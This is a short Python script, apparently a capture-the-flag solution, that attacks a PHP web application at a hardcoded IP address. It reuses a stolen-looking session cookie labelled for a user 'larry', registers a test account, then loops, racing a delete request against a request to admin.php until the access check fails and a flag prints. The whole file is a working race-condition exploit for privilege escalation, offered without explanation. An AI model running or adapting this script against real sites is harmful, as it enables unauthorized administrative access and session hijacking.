import requests, concurrent.futures, re

# Define the URLs for the requests
url1 = "http://94.237.59.63:37546/manage.php"
url3 = "http://94.237.59.63:37546/admin.php"
#proxies = {'http': 'http://127.0.0.1:8080'}

payload1 = {'username': 'test', 'password': 'test', 'register': ''}
payload2 = {'delete': ''}

#larry : 190565037
larry_cookies = {'PHPSESSID': 'plq3qdu94rad84f4h369ht2n52'}
found = False

def login_user(r):
    data = {"username": "test", "password": "test"}
    response = r.post("http://94.237.59.63:37546/login.php", data=data, allow_redirects=False)
    print("[*] Logged in" if str(response.status_code) == "302" else "[!] Login Failed")

def send_delete_post_request(r):
    response = r.post(url1, data=payload2, allow_redirects=False)
    print("[*] Deleted" if str(response.status_code) == "302" else "[!] Failed")

def send_get_request(r):
    global found  # Declare found as global to modify the outer scope variable
    response = r.get(url3, allow_redirects=False)
    if response.status_code == 302:
        print("[*] Accessed")
    else:
        print("Flag Found!!!", response.text)
        found = True



while not found:
    # Send the first POST request to create
    response = requests.post(url1, payload1, cookies=larry_cookies, allow_redirects=False)
    print("[*] Test User Created" if str(response.status_code) == "200" else "[!] User Creation Failed")

    r1 = requests.Session()
    r2 = requests.Session()

    login_user(r1)
    login_user(r2)

    # Use ThreadPoolExecutor to send the second POST request to delete and the GET request to admin concurrently
    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
        futures = [
            executor.submit(send_delete_post_request, r1),
            executor.submit(send_get_request, r2)
        ]

        # Wait for all futures to complete
        concurrent.futures.wait(futures)